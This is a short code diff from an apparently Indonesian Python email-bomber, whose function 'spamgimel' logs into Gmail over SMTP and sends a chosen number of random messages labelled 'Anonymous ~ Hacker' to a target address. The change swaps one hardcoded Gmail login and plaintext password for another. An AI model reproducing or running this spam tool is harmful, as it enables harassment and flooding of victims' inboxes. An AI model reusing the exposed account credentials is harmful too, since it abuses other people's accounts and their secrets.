@@ -81,12 +81,12 @@ def spamgimel():
                 server = smtplib.SMTP('smtp.gmail.com', 587)
                 server.ehlo()
                 server.starttls()
-                server.login('spamz.barbar@gmail.com', 'Barbar05')
+                server.login('ksanihtest@gmail.com', 'ksanihbous03')
                 hasil = ''
                 for i in range(jumlah):
                     mess = ''.join(random.choice(abece) for _ in range(4))
                     msg = f'From: {random.randint(1, 100)}<Hacker>\nSubject: Anonymous ~ Hacker\n{mess}'
-                    server.sendmail('spamz.barbar@gmail.com', target_imel, msg)
+                    server.sendmail('ksanihtest@gmail.com', target_imel, msg)
                     hasil += '[!] Sukses\n'
                 server.quit()
                 return {
